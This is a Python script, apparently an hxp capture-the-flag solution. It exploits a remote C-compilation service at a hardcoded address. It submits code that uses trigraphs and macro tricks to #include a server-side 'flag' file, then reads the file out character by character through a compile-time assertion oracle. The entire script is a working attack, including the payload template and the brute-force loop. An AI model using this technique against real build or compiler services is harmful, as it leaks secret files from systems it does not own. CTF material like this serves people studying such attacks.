#!/usr/bin/env python3

import base64
import string
import socket
import sys

server = '88.198.154.157'
#server = '127.0.0.7'
port = 8011

templ = '''
	_Pragma("GCC diagnostic ignored \\"-Weverything\\"");

	??=define MY_COMPILER_ASSERT(EXPRESSION)   switch (0) ??<case 0: case (EXPRESSION):;??>

	??=define TOSTR(...) (??=__VA_ARGS__)
	??=define hxp TOSTR(
	const char a[] =
	??=include "flag"
	);


	MY_COMPILER_ASSERT(a[{}] == {});

	return 0;
'''

flag_suffix = ''

def send(code):
    to_send = base64.b64encode(code.encode())

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.recv(15)
    s.sendall(to_send)
    s.shutdown(socket.SHUT_WR)
    data = s.recv(15)
    s.close()
    return repr(data)

def check_char(i, c):
    global flag_suffix
    c_main = templ.format(i, ord(c))
    ret = send(c_main)
    if 'Not' in ret:
        return False

    flag_suffix += c
    return True

def bf_char(i):
    for c in string.printable:
        if check_char(i, c):
            return True

    return False

def bf_all(i):
    if bf_char(i):
        bf_all(i+1)

if __name__ == '__main__':
    bf_all(0)

    print('hxp'+flag_suffix)
